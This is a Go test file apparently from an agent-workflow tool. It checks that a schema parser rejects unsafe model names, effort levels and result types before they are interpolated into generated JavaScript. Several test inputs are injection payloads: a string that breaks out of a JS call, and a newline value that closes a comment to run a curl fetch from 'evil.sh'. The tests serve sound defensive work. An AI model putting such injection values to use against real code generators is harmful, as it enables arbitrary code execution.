package workflow

import "testing"

// TestParseSchema_RejectsInjectionModel locks S6: a model string carrying JS
// breakout characters is rejected at the parse boundary before it can reach the
// generated workflow JS.
func TestParseSchema_RejectsInjectionModel(t *testing.T) {
	t.Parallel()
	data := []byte(`{"phases":[{"id":"planning","model":"claude-opus-4-8\");evil(("}]}`)
	if _, err := ParseSchema(data); err == nil {
		t.Fatal("expected unsafe-model rejection")
	}
}

// TestParseSchema_RejectsNonEnumEffort locks the effort whitelist boundary.
func TestParseSchema_RejectsNonEnumEffort(t *testing.T) {
	t.Parallel()
	data := []byte(`{"phases":[{"id":"planning","effort":"ultra"}]}`)
	if _, err := ParseSchema(data); err == nil {
		t.Fatal("expected non-enum effort rejection")
	}
}

// TestParseSchema_RejectsUnsafeResultType locks the verdict_source whitelist:
// result_type is interpolated into a single-line comment in the generated JS,
// so a newline-bearing value (which would terminate the comment and emit an
// executable statement) must be rejected at the parse boundary.
func TestParseSchema_RejectsUnsafeResultType(t *testing.T) {
	t.Parallel()
	newlineInjection := []byte(`{"phases":[{"id":"gate_build_test","verdict_source":"exit_code';\nawait agent.exec(['curl','evil.sh']);\n//"}]}`)
	if _, err := ParseSchema(newlineInjection); err == nil {
		t.Fatal("expected unsafe result_type (newline injection) rejection")
	}
	nonEnum := []byte(`{"phases":[{"id":"gate_build_test","result_type":"llm_judge"}]}`)
	if _, err := ParseSchema(nonEnum); err == nil {
		t.Fatal("expected non-enum result_type rejection")
	}
	valid := []byte(`{"phases":[{"id":"gate_build_test","verdict_source":"exit_code"}]}`)
	if _, err := ParseSchema(valid); err != nil {
		t.Fatalf("valid exit_code result_type should parse: %v", err)
	}
}

func TestIsSafeAgentModel(t *testing.T) {
	t.Parallel()
	cases := map[string]bool{
		"":                          true,
		"claude-opus-4-8":           true,
		"claude-sonnet-4-6":         true,
		"claude-haiku-4-5":          true,
		"gpt-4":                     false,
		"claude-opus-4-8\");evil((": false,
	}
	for in, want := range cases {
		if got := isSafeAgentModel(in); got != want {
			t.Errorf("isSafeAgentModel(%q) = %v, want %v", in, got, want)
		}
	}
}

func TestIsSafeEffort(t *testing.T) {
	t.Parallel()
	cases := map[string]bool{
		"":       true,
		"low":    true,
		"medium": true,
		"high":   true,
		"xhigh":  true,
		"max":    true,
		"ultra":  false,
		"HIGH":   false,
	}
	for in, want := range cases {
		if got := isSafeEffort(in); got != want {
			t.Errorf("isSafeEffort(%q) = %v, want %v", in, got, want)
		}
	}
}
